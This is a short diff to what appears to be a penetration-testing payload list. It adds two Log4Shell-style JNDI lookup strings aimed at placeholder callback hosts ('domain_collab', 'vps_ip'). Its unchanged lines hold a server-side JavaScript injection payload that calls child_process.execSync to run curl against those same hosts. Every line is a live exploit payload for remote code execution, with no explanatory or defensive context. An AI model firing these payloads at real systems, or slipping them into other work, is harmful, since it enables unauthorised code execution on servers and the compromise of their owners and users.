@@ -1,3 +1,5 @@
+${jndi:ldap://domain_collab/a}
+${jndi:ldap://vps_ip:80/a}
 ){this.global.process.mainModule.require("child_process").execSync("curl domain_collab/rce")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("curl vps_ip:80/rce")}; with(obj
 vps_ip
